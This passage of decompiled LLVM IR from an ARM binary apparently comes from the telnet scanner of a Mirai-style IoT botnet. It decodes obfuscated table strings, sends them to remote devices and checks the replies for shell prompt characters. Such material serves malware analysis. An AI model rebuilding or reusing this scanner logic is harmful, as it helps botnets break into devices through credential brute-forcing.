  %v1_fef4 = load i32, i32* @r6, align 4
  %v2_fef4 = add i32 %v1_fef4, 12
  %v3_fef4 = inttoptr i32 %v2_fef4 to i32*
  store i32 5, i32* %v3_fef4, align 4
  br label %dec_label_pc_f94c

dec_label_pc_fefc:                                ; preds = %dec_label_pc_f784
  %v1_fefc = add i32 %v0_f784, 24
  %v2_fefc = inttoptr i32 %v1_fefc to i32*
  %v3_fefc = load i32, i32* %v2_fefc, align 4
  store i32 %v3_fefc, i32* %r2.global-to-local, align 4
  %v1_ff00 = add i32 %v3_fefc, -1
  store i32 %v1_ff00, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff04 = icmp eq i32 %v1_ff00, 0
  store i1 %v2_ff04, i1* %cpsr_z.global-to-local, align 1
  %tmp451 = icmp slt i32 %v1_ff00, 1
  br i1 %tmp451, label %dec_label_pc_f704.backedge.thread, label %dec_label_pc_ff0c

dec_label_pc_ff0c:                                ; preds = %dec_label_pc_fefc
  %v2_ff0c = add i32 %v1_ff00, %v0_f784
  store i32 %v2_ff0c, i32* %r3.global-to-local, align 4
  %v1_ff10 = add i32 %v2_ff0c, 28
  %v2_ff10 = inttoptr i32 %v1_ff10 to i8*
  %v3_ff10 = load i8, i8* %v2_ff10, align 1
  %v4_ff10 = zext i8 %v3_ff10 to i32
  store i32 %v4_ff10, i32* %r3.global-to-local, align 4
  %v2_ff14 = icmp ugt i8 %v3_ff10, 61
  store i1 %v2_ff14, i1* %cpsr_c.global-to-local, align 1
  %v7_ff14 = icmp eq i8 %v3_ff10, 62
  store i1 %v7_ff14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff14, label %dec_label_pc_ff78, label %bb452

bb452:                                            ; preds = %dec_label_pc_ff0c
  %v3_ff18 = icmp ugt i8 %v3_ff10, 57
  store i1 %v3_ff18, i1* %cpsr_c.global-to-local, align 1
  %v8_ff18 = icmp eq i8 %v3_ff10, 58
  store i1 %v8_ff18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff18, label %dec_label_pc_ff78, label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %bb452
  %v2_ff20 = icmp ugt i8 %v3_ff10, 35
  store i1 %v2_ff20, i1* %cpsr_c.global-to-local, align 1
  %v7_ff20 = icmp eq i8 %v3_ff10, 36
  store i1 %v7_ff20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff20, label %dec_label_pc_ff78, label %dec_label_pc_ff28

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff20
  %v2_ff28 = icmp ugt i8 %v3_ff10, 34
  store i1 %v2_ff28, i1* %cpsr_c.global-to-local, align 1
  %v7_ff28 = icmp eq i8 %v3_ff10, 35
  store i1 %v7_ff28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff28, label %dec_label_pc_ff78, label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %dec_label_pc_ff28
  %v2_ff30 = icmp ugt i8 %v3_ff10, 36
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  %v7_ff30 = icmp eq i8 %v3_ff10, 37
  store i1 %v7_ff30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff30, label %dec_label_pc_ff78, label %dec_label_pc_ff60.preheader

dec_label_pc_ff60.preheader:                      ; preds = %dec_label_pc_ff30
  %v3_ff34 = add i32 %v0_f784, 28
  %v2_ff38 = add i32 %v3_ff34, %v3_fefc
  store i32 %v2_ff38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff60

dec_label_pc_ff44:                                ; preds = %bb453
  %v2_ff44 = icmp ugt i8 %v3_ff68, 35
  store i1 %v2_ff44, i1* %cpsr_c.global-to-local, align 1
  %v7_ff44 = icmp eq i8 %v3_ff68, 36
  store i1 %v7_ff44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff44, label %dec_label_pc_ff78, label %dec_label_pc_ff4c

dec_label_pc_ff4c:                                ; preds = %dec_label_pc_ff44
  %v2_ff4c = icmp ugt i8 %v3_ff68, 34
  store i1 %v2_ff4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff4c = icmp eq i8 %v3_ff68, 35
  store i1 %v7_ff4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff4c, label %dec_label_pc_ff78, label %dec_label_pc_ff54

dec_label_pc_ff54:                                ; preds = %dec_label_pc_ff4c
  %v2_ff54 = icmp ugt i8 %v3_ff68, 36
  store i1 %v2_ff54, i1* %cpsr_c.global-to-local, align 1
  %v7_ff54 = icmp eq i8 %v3_ff68, 37
  store i1 %v7_ff54, i1* %cpsr_z.global-to-local, align 1
  %v1_ff58 = add i32 %v0_ff58, -1
  store i32 %v1_ff58, i32* %r3.global-to-local, align 4
  br i1 %v7_ff54, label %dec_label_pc_ff78, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff60.preheader, %dec_label_pc_ff54
  %v0_ff58 = phi i32 [ %v2_ff38, %dec_label_pc_ff60.preheader ], [ %v1_ff58, %dec_label_pc_ff54 ]
  %v0_ff60 = phi i32 [ %v1_ff00, %dec_label_pc_ff60.preheader ], [ %v1_ff60, %dec_label_pc_ff54 ]
  %v1_ff60 = add i32 %v0_ff60, -1
  store i32 %v1_ff60, i32* %r1.global-to-local, align 4
  %v2_ff60 = icmp ne i32 %v0_ff60, 0
  store i1 %v2_ff60, i1* %cpsr_c.global-to-local, align 1
  %v7_ff60 = icmp eq i32 %v0_ff60, 1
  store i1 %v7_ff60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff60, label %dec_label_pc_f704.backedge.thread564, label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff60
  %v1_ff68 = add i32 %v0_ff58, -2
  %v2_ff68 = inttoptr i32 %v1_ff68 to i8*
  %v3_ff68 = load i8, i8* %v2_ff68, align 1
  %v4_ff68 = zext i8 %v3_ff68 to i32
  store i32 %v4_ff68, i32* %r2.global-to-local, align 4
  %v2_ff6c = icmp ugt i8 %v3_ff68, 61
  store i1 %v2_ff6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff6c = icmp eq i8 %v3_ff68, 62
  store i1 %v7_ff6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff6c, label %dec_label_pc_ff78, label %bb453

bb453:                                            ; preds = %dec_label_pc_ff68
  %v3_ff70 = icmp ugt i8 %v3_ff68, 57
  store i1 %v3_ff70, i1* %cpsr_c.global-to-local, align 1
  %v8_ff70 = icmp eq i8 %v3_ff68, 58
  store i1 %v8_ff70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff70, label %dec_label_pc_ff78, label %dec_label_pc_ff44

dec_label_pc_ff78:                                ; preds = %dec_label_pc_ff68, %bb453, %dec_label_pc_ff54, %dec_label_pc_ff4c, %dec_label_pc_ff44, %dec_label_pc_ff30, %dec_label_pc_ff0c, %dec_label_pc_ff28, %dec_label_pc_ff20, %bb452
  %v0_ff7c = phi i32 [ %v1_ff00, %dec_label_pc_ff30 ], [ %v1_ff00, %dec_label_pc_ff0c ], [ %v1_ff00, %dec_label_pc_ff28 ], [ %v1_ff00, %dec_label_pc_ff20 ], [ %v1_ff00, %bb452 ], [ %v1_ff60, %dec_label_pc_ff44 ], [ %v1_ff60, %dec_label_pc_ff4c ], [ %v1_ff60, %dec_label_pc_ff54 ], [ %v1_ff60, %bb453 ], [ %v1_ff60, %dec_label_pc_ff68 ]
  %v1_ff7c = add i32 %v0_ff7c, 1
  store i32 %v1_ff7c, i32* @r7, align 4
  %v1_ff80 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_ff90 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  %v3_ff94 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ff94, i32* %r2.global-to-local, align 4
  store i32 %v3_ff90, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ffa0 = load i32, i32* @r6, align 4
  %v1_ffa0 = add i32 %v0_ffa0, 4
  %v2_ffa0 = inttoptr i32 %v1_ffa0 to i32*
  %v3_ffa0 = load i32, i32* %v2_ffa0, align 4
  %v4_ffa4 = call i32 @__libc_send(i32 %v3_ffa0, i32 %v3_ff90, i32 %v3_ff94, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ffb4 = load i32, i32* @r6, align 4
  %v1_ffb4 = add i32 %v0_ffb4, 4
  %v2_ffb4 = inttoptr i32 %v1_ffb4 to i32*
  %v3_ffb4 = load i32, i32* %v2_ffb4, align 4
  %v4_ffb8 = call i32 @__libc_send(i32 %v3_ffb4, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  %v1_ffc0 = call i32 @table_lock_val(i32 6)
  store i32 8, i32* @r3, align 4
  %v1_ffc8 = load i32, i32* @r6, align 4
  %v2_ffc8 = add i32 %v1_ffc8, 12
  %v3_ffc8 = inttoptr i32 %v2_ffc8 to i32*
  store i32 8, i32* %v3_ffc8, align 4
  br label %dec_label_pc_f954

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_f784
  %v1_ffd0 = add i32 %v0_f784, 24
  %v2_ffd0 = inttoptr i32 %v1_ffd0 to i32*
  %v3_ffd0 = load i32, i32* %v2_ffd0, align 4
  store i32 %v3_ffd0, i32* %r2.global-to-local, align 4
  %v1_ffd4 = add i32 %v3_ffd0, -1
  store i32 %v1_ffd4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffd8 = icmp eq i32 %v1_ffd4, 0
  store i1 %v2_ffd8, i1* %cpsr_z.global-to-local, align 1
  %tmp454 = icmp slt i32 %v1_ffd4, 1
  br i1 %tmp454, label %dec_label_pc_1004c, label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ffd0
  %v2_ffe0 = add i32 %v1_ffd4, %v0_f784
  store i32 %v2_ffe0, i32* %r3.global-to-local, align 4
  %v1_ffe4 = add i32 %v2_ffe0, 28
  %v2_ffe4 = inttoptr i32 %v1_ffe4 to i8*
  %v3_ffe4 = load i8, i8* %v2_ffe4, align 1
  %v4_ffe4 = zext i8 %v3_ffe4 to i32
  store i32 %v4_ffe4, i32* %r3.global-to-local, align 4
  %v2_ffe8 = icmp ugt i8 %v3_ffe4, 61
  store i1 %v2_ffe8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffe8 = icmp eq i8 %v3_ffe4, 62
  store i1 %v7_ffe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffe8, label %dec_label_pc_10164, label %bb455

bb455:                                            ; preds = %dec_label_pc_ffe0
  %v3_ffec = icmp ugt i8 %v3_ffe4, 57
  store i1 %v3_ffec, i1* %cpsr_c.global-to-local, align 1
  %v8_ffec = icmp eq i8 %v3_ffe4, 58
  store i1 %v8_ffec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ffec, label %dec_label_pc_10164, label %dec_label_pc_fff4

dec_label_pc_fff4:                                ; preds = %bb455
  %v2_fff4 = icmp ugt i8 %v3_ffe4, 35
  store i1 %v2_fff4, i1* %cpsr_c.global-to-local, align 1
  %v7_fff4 = icmp eq i8 %v3_ffe4, 36
  store i1 %v7_fff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fff4, label %dec_label_pc_10164, label %dec_label_pc_fffc

dec_label_pc_fffc:                                ; preds = %dec_label_pc_fff4
  %v2_fffc = icmp ugt i8 %v3_ffe4, 34
  store i1 %v2_fffc, i1* %cpsr_c.global-to-local, align 1
  %v7_fffc = icmp eq i8 %v3_ffe4, 35
  store i1 %v7_fffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fffc, label %dec_label_pc_10164, label %dec_label_pc_10004

dec_label_pc_10004:                               ; preds = %dec_label_pc_fffc
  %v2_10004 = icmp ugt i8 %v3_ffe4, 36
  store i1 %v2_10004, i1* %cpsr_c.global-to-local, align 1
  %v7_10004 = icmp eq i8 %v3_ffe4, 37
  store i1 %v7_10004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10004, label %dec_label_pc_10164, label %dec_label_pc_10044.preheader

dec_label_pc_10044.preheader:                     ; preds = %dec_label_pc_10004
  %v3_10008 = add i32 %v0_f784, 28
  %v2_1000c = add i32 %v3_10008, %v3_ffd0
  store i32 %v2_1000c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10044

dec_label_pc_10018:                               ; preds = %dec_label_pc_10044
  %v1_10018 = add i32 %v0_1003c, -2
  %v2_10018 = inttoptr i32 %v1_10018 to i8*
  %v3_10018 = load i8, i8* %v2_10018, align 1
  %v4_10018 = zext i8 %v3_10018 to i32
  store i32 %v4_10018, i32* %r2.global-to-local, align 4
  %v2_1001c = icmp ugt i8 %v3_10018, 61
  store i1 %v2_1001c, i1* %cpsr_c.global-to-local, align 1
  %v7_1001c = icmp eq i8 %v3_10018, 62
  store i1 %v7_1001c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1001c, label %dec_label_pc_10164, label %bb456

bb456:                                            ; preds = %dec_label_pc_10018
  %v3_10020 = icmp ugt i8 %v3_10018, 57
  store i1 %v3_10020, i1* %cpsr_c.global-to-local, align 1
  %v8_10020 = icmp eq i8 %v3_10018, 58
  store i1 %v8_10020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10020, label %dec_label_pc_10164, label %dec_label_pc_10028

dec_label_pc_10028:                               ; preds = %bb456
  %v2_10028 = icmp ugt i8 %v3_10018, 35
  store i1 %v2_10028, i1* %cpsr_c.global-to-local, align 1
  %v7_10028 = icmp eq i8 %v3_10018, 36
  store i1 %v7_10028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10028, label %dec_label_pc_10164, label %dec_label_pc_10030

dec_label_pc_10030:                               ; preds = %dec_label_pc_10028
  %v2_10030 = icmp ugt i8 %v3_10018, 34
  store i1 %v2_10030, i1* %cpsr_c.global-to-local, align 1
  %v7_10030 = icmp eq i8 %v3_10018, 35
  store i1 %v7_10030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10030, label %dec_label_pc_10164, label %dec_label_pc_10038

dec_label_pc_10038:                               ; preds = %dec_label_pc_10030
  %v2_10038 = icmp ugt i8 %v3_10018, 36
  store i1 %v2_10038, i1* %cpsr_c.global-to-local, align 1
  %v7_10038 = icmp eq i8 %v3_10018, 37
  store i1 %v7_10038, i1* %cpsr_z.global-to-local, align 1
  %v1_1003c = add i32 %v0_1003c, -1
  store i32 %v1_1003c, i32* %r3.global-to-local, align 4
  br i1 %v7_10038, label %dec_label_pc_10164, label %dec_label_pc_10044

dec_label_pc_10044:                               ; preds = %dec_label_pc_10044.preheader, %dec_label_pc_10038
  %v0_1003c = phi i32 [ %v2_1000c, %dec_label_pc_10044.preheader ], [ %v1_1003c, %dec_label_pc_10038 ]
  %v0_10044 = phi i32 [ %v1_ffd4, %dec_label_pc_10044.preheader ], [ %v1_10044, %dec_label_pc_10038 ]
  %v1_10044 = add i32 %v0_10044, -1
  store i32 %v1_10044, i32* %r1.global-to-local, align 4
  %v2_10044 = icmp ne i32 %v0_10044, 0
  store i1 %v2_10044, i1* %cpsr_c.global-to-local, align 1
  %v7_10044 = icmp eq i32 %v0_10044, 1
  store i1 %v7_10044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10044, label %dec_label_pc_1004c, label %dec_label_pc_10018

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10044, %dec_label_pc_ffd0
  %v1_10050 = call i32 @table_unlock_val(i32 31)
  %v1_10058 = call i32 @table_unlock_val(i32 32)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_10068 = call i32 @table_retrieve_val(i32 31, i32* nonnull %stack_var_-60)
  store i32 %v3_10068, i32* @r4, align 4
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_1007c = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  %v3_10080 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1007c, i32* @r5, align 4
  %v0_10088 = load i32, i32* @r4, align 4
  store i32 %v0_10088, i32* %r2.global-to-local, align 4
  %v1_1008c = add i32 %v3_10080, -1
  store i32 %v1_1008c, i32* %r3.global-to-local, align 4
  %v0_10090 = load i32, i32* @fp, align 4
  %v0_10094 = load i32, i32* @r6, align 4
  %v1_10094 = add i32 %v0_10094, 24
  %v2_10094 = inttoptr i32 %v1_10094 to i32*
  %v3_10094 = load i32, i32* %v2_10094, align 4
  store i32 %v3_10094, i32* %r1.global-to-local, align 4
  %v4_10098 = call i32 @util_memsearch(i32 %v0_10090, i32 %v3_10094, i32 %v0_10088, i32 %v1_1008c)
  %v2_1009c = icmp eq i32 %v4_10098, -1
  store i1 %v2_1009c, i1* %cpsr_c.global-to-local, align 1
  %v7_1009c = icmp eq i32 %v4_10098, -1
  store i1 %v7_1009c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1009c, label %dec_label_pc_100ac, label %dec_label_pc_100d4

dec_label_pc_100ac:                               ; preds = %dec_label_pc_1004c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_100ac = load i32, i32* %stack_var_-60, align 4
  %v0_100b0 = load i32, i32* @r5, align 4
  store i32 %v0_100b0, i32* %r2.global-to-local, align 4
  %v1_100b4 = add i32 %v3_100ac, -1
  store i32 %v1_100b4, i32* %r3.global-to-local, align 4
  %v0_100b8 = load i32, i32* @fp, align 4
  %v0_100bc = load i32, i32* @r6, align 4
  %v1_100bc = add i32 %v0_100bc, 24
  %v2_100bc = inttoptr i32 %v1_100bc to i32*
  %v3_100bc = load i32, i32* %v2_100bc, align 4
  store i32 %v3_100bc, i32* %r1.global-to-local, align 4
  %v4_100c0 = call i32 @util_memsearch(i32 %v0_100b8, i32 %v3_100bc, i32 %v0_100b0, i32 %v1_100b4)
  %v1_100c4 = add i32 %v4_100c0, 1
  store i32 %v1_100c4, i32* @r7, align 4
  %v2_100c4 = icmp eq i32 %v4_100c0, -1
  store i1 %v2_100c4, i1* %cpsr_c.global-to-local, align 1
  %v7_100c4 = icmp eq i32 %v1_100c4, 0
  store i1 %v7_100c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100c4, label %dec_label_pc_10474, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100ac, %dec_label_pc_1004c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_100d8 = call i32 @table_lock_val(i32 31)
  %v1_100e0 = call i32 @table_lock_val(i32 32)
  %v0_100e4 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100e4 = icmp eq i32 %v0_100e4, 0
  store i1 %v2_100e4, i1* %cpsr_z.global-to-local, align 1
  %tmp457 = icmp slt i32 %v0_100e4, 1
  br i1 %tmp457, label %dec_label_pc_f94c, label %dec_label_pc_10178

dec_label_pc_100f0:                               ; preds = %dec_label_pc_fa94
  store i32 %v2_100f4, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19b5c.209 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_100f4, i32* @r0, align 4
  store i32 %v2_10108, i32* @sl, align 4
  %v0_1010c = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_10108, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19b53.211 to i32), i32* @r1, align 4
  %v0_1011c = call i32 @memcpy()
  %v0_10120 = load i32, i32* @r6, align 4
  %v1_10120 = add i32 %v0_10120, 24
  %v2_10120 = inttoptr i32 %v1_10120 to i32*
  %v3_10120 = load i32, i32* %v2_10120, align 4
  %v0_10124 = load i32, i32* @r4, align 4
  %v1_10124 = add i32 %v0_10124, 2
  store i32 %v1_10124, i32* %r2.global-to-local, align 4
  %v0_10128 = load i32, i32* @fp, align 4
  %v2_10128 = add i32 %v0_10128, %v3_10120
  store i32 %v2_10128, i32* @r3, align 4
  %v3_1012c = icmp uge i32 %v2_10128, %v1_10124
  store i1 %v3_1012c, i1* %cpsr_c.global-to-local, align 1
  %v9_1012c = icmp eq i32 %v2_10128, %v1_10124
  store i1 %v9_1012c, i1* %cpsr_z.global-to-local, align 1
  %v2_10130 = xor i1 %v3_1012c, true
  %v3_10130 = or i1 %v9_1012c, %v2_10130
  br i1 %v3_10130, label %dec_label_pc_100f0.dec_label_pc_fb10.loopexit_crit_edge, label %dec_label_pc_10134

dec_label_pc_100f0.dec_label_pc_fb10.loopexit_crit_edge: ; preds = %dec_label_pc_100f0
  %v0_fb10.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fb10

dec_label_pc_10134:                               ; preds = %dec_label_pc_100f0
  %v2_10134 = inttoptr i32 %v1_10124 to i8*
  %v3_10134 = load i8, i8* %v2_10134, align 1
  %v4_10134 = zext i8 %v3_10134 to i32
  store i32 %v4_10134, i32* %r3.global-to-local, align 4
  %v2_10138 = icmp ugt i8 %v3_10134, 30
  store i1 %v2_10138, i1* %cpsr_c.global-to-local, align 1
  %v7_10138 = icmp eq i8 %v3_10134, 31
  store i1 %v7_10138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10138, label %dec_label_pc_10204, label %dec_label_pc_10140

dec_label_pc_10140:                               ; preds = %dec_label_pc_10134
  %v1_10140 = inttoptr i32 %v0_10124 to i8*
  %v2_10140 = load i8, i8* %v1_10140, align 1
  %v3_10140 = zext i8 %v2_10140 to i32
  store i32 %v3_10140, i32* %r3.global-to-local, align 4
  %v2_10144 = icmp ugt i8 %v2_10140, -4
  store i1 %v2_10144, i1* %cpsr_c.global-to-local, align 1
  %v7_10144 = icmp eq i8 %v2_10140, -3
  store i1 %v7_10144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10144, label %.thread147, label %dec_label_pc_10154

.thread147:                                       ; preds = %dec_label_pc_10140
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10140, align 1
  %v0_10150.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10150.pr.pr, label %dec_label_pc_faa8, label %.thread147.dec_label_pc_10154thread-pre-split_crit_edge

.thread147.dec_label_pc_10154thread-pre-split_crit_edge: ; preds = %.thread147
  %v0_10154.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %dec_label_pc_10140, %.thread147.dec_label_pc_10154thread-pre-split_crit_edge
  %v0_10154.pr = phi i32 [ %v0_10154.pr.pre, %.thread147.dec_label_pc_10154thread-pre-split_crit_edge ], [ %v3_10140, %dec_label_pc_10140 ]
  %v2_10154 = icmp ugt i32 %v0_10154.pr, 250
  store i1 %v2_10154, i1* %cpsr_c.global-to-local, align 1
  %v7_10154 = icmp eq i32 %v0_10154.pr, 251
  store i1 %v7_10154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10154, label %bb458, label %dec_label_pc_faa8

bb458:                                            ; preds = %dec_label_pc_10154
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_1015c = load i32, i32* @r4, align 4
  %v4_1015c = inttoptr i32 %v3_1015c to i8*
  store i8 -3, i8* %v4_1015c, align 1
  br label %dec_label_pc_faa8

dec_label_pc_10164:                               ; preds = %dec_label_pc_10018, %dec_label_pc_10038, %dec_label_pc_10030, %dec_label_pc_10028, %bb456, %dec_label_pc_10004, %dec_label_pc_ffe0, %dec_label_pc_fffc, %dec_label_pc_fff4, %bb455
  %v0_10168 = phi i32 [ %v1_ffd4, %dec_label_pc_10004 ], [ %v1_ffd4, %dec_label_pc_ffe0 ], [ %v1_ffd4, %dec_label_pc_fffc ], [ %v1_ffd4, %dec_label_pc_fff4 ], [ %v1_ffd4, %bb455 ], [ %v1_10044, %bb456 ], [ %v1_10044, %dec_label_pc_10028 ], [ %v1_10044, %dec_label_pc_10030 ], [ %v1_10044, %dec_label_pc_10038 ], [ %v1_10044, %dec_label_pc_10018 ]
  %v1_10168 = add i32 %v0_10168, 1
  store i32 %v1_10168, i32* @r7, align 4
  %v1_1016c = call i32 @table_lock_val(i32 31)
  %v1_10174 = call i32 @table_lock_val(i32 32)
  br label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_100d4, %dec_label_pc_10164
  %v0_10178 = load i32, i32* @r6, align 4
  %v1_10178 = inttoptr i32 %v0_10178 to i32*
  %v2_10178 = load i32, i32* %v1_10178, align 4
  store i32 %v2_10178, i32* %r3.global-to-local, align 4
  %v1_1017c = add i32 %v0_10178, 4
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  %v1_10180 = add i32 %v2_10178, 12
  %v2_10180 = inttoptr i32 %v1_10180 to i8*
  %v3_10180 = load i8, i8* %v2_10180, align 1
  %v4_10180 = zext i8 %v3_10180 to i32
  store i32 %v4_10180, i32* %r2.global-to-local, align 4
  %v1_10184 = inttoptr i32 %v2_10178 to i32*
  %v2_10184 = load i32, i32* %v1_10184, align 4
  store i32 %v2_10184, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1018c = call i32 @__libc_send(i32 %v3_1017c, i32 %v2_10184, i32 %v4_10180, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10194 = load i32, i32* @r6, align 4
  %v1_10194 = add i32 %v0_10194, 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  %v3_10194 = load i32, i32* %v2_10194, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_101a0 = call i32 @__libc_send(i32 %v3_10194, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  store i32 4, i32* @r3, align 4
  %v1_101a8 = load i32, i32* @r6, align 4
  %v2_101a8 = add i32 %v1_101a8, 12
  %v3_101a8 = inttoptr i32 %v2_101a8 to i32*
  store i32 4, i32* %v3_101a8, align 4
  br label %dec_label_pc_f94c

dec_label_pc_101b0:                               ; preds = %dec_label_pc_fe50, %dec_label_pc_fe68, %dec_label_pc_fe60, %bb450, %dec_label_pc_fe3c, %dec_label_pc_fe20, %dec_label_pc_fe34, %bb449
  %v0_101b4 = phi i32 [ %v1_fe14, %dec_label_pc_fe3c ], [ %v1_fe14, %dec_label_pc_fe20 ], [ %v1_fe14, %dec_label_pc_fe34 ], [ %v1_fe14, %bb449 ], [ %v1_fe74, %bb450 ], [ %v1_fe74, %dec_label_pc_fe60 ], [ %v1_fe74, %dec_label_pc_fe68 ], [ %v1_fe74, %dec_label_pc_fe50 ]
  %v1_101b4 = add i32 %v0_101b4, 1
  store i32 %v1_101b4, i32* @r7, align 4
  %v1_101b8 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fec4

dec_label_pc_101c0:                               ; preds = %dec_label_pc_f828
  %v0_101c8 = load i32, i32* @r6, align 4
  %v1_101c8 = add i32 %v0_101c8, 4
  %v2_101c8 = inttoptr i32 %v1_101c8 to i32*
  %v3_101c8 = load i32, i32* %v2_101c8, align 4
  %v1_101cc = call i32 @__GI___libc_close(i32 %v3_101c8)
  %v0_101d0 = load i32, i32* @r6, align 4
  %v1_101d0 = add i32 %v0_101d0, 384
  %v2_101d0 = inttoptr i32 %v1_101d0 to i8*
  %v3_101d0 = load i8, i8* %v2_101d0, align 1
  %v4_101d0 = zext i8 %v3_101d0 to i32
  %v1_101d4 = add nuw nsw i32 %v4_101d0, 1
  %v1_101d8 = urem i32 %v1_101d4, 256
  store i32 %v1_101d8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_101e0 = icmp ugt i32 %v1_101d8, 9
  store i1 %v2_101e0, i1* %cpsr_c.global-to-local, align 1
  %v7_101e0 = icmp eq i32 %v1_101d8, 10
  store i1 %v7_101e0, i1* %cpsr_z.global-to-local, align 1
  %v2_101e4 = add i32 %v0_101d0, 4
  %v3_101e4 = inttoptr i32 %v2_101e4 to i32*
  store i32 -1, i32* %v3_101e4, align 4
  %v0_101e8 = load i32, i32* @r3, align 4
  %v1_101e8 = trunc i32 %v0_101e8 to i8
  %v2_101e8 = load i32, i32* @r6, align 4
  %v3_101e8 = add i32 %v2_101e8, 384
  %v4_101e8 = inttoptr i32 %v3_101e8 to i8*
  store i8 %v1_101e8, i8* %v4_101e8, align 1
  %v0_101ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101ec, label %dec_label_pc_101f0, label %dec_label_pc_1024c

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101c0
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r7, align 4
  %v1_101f8 = load i32, i32* @r6, align 4
  %v2_101f8 = add i32 %v1_101f8, 12
  %v3_101f8 = inttoptr i32 %v2_101f8 to i32*
  store i32 0, i32* %v3_101f8, align 4
  %v0_101fc = load i32, i32* @r3, align 4
  %v1_101fc = trunc i32 %v0_101fc to i8
  %v2_101fc = load i32, i32* @r6, align 4
  %v3_101fc = add i32 %v2_101fc, 384
  %v4_101fc = inttoptr i32 %v3_101fc to i8*
  store i8 %v1_101fc, i8* %v4_101fc, align 1
  br label %dec_label_pc_f954

dec_label_pc_10204:                               ; preds = %dec_label_pc_10134
